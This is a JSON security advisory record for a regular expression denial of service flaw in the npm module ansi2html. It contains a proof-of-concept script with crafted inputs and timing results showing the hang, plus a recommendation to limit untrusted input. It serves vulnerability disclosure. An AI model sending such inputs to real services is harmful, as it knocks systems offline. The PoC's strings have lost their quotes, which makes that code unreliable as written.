{
  "id": 51,
  "created_at": "2015-10-25",
  "updated_at": "2016-04-20",
  "title": "Regular Expression Denial of Service",
  "author": {
    "name": "Adam Baldwin",
    "website": null,
    "username": null
  },
  "module_name": "ansi2html",
  "publish_date": "2015-10-25",
  "cves": [],
  "vulnerable_versions": "<=99.999.99999",
  "patched_versions": "<0.0.0",
  "overview": "ansi2html is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in.        The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time. [1]        ###Proof of concept    ```    var ansi2html = require(ansi2html)        var start = process.hrtime();    ansi2html([1111111111111111111111;0000000000000000000000);    console.log(process.hrtime(start));        start = process.hrtime();    ansi2html([1111111111111111111111;00000000000000000000000);    console.log(process.hrtime(start));        start = process.hrtime();    ansi2html([1111111111111111111111;000000000000000000000000);    console.log(process.hrtime(start));        start = process.hrtime();    ansi2html([1111111111111111111111;0000000000000000000000000000);    console.log(process.hrtime(start));    ```        Results of the above    ```    00:29:53-adam_baldwin~/tmp$ node test    [ 0, 119615367 ]    [ 0, 149934565 ]    [ 0, 233325677 ]    [ 3, 46582479 ]    ```",
  "recommendation": "There is currently no available fix. Do not pass untrusted input into ansi2html or limit the size of the user input to limit input.",
  "references": [
    "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
  ],
  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
  "cvss_score": 7.5,
  "coordinating_vendor": "^Lift Security"
}
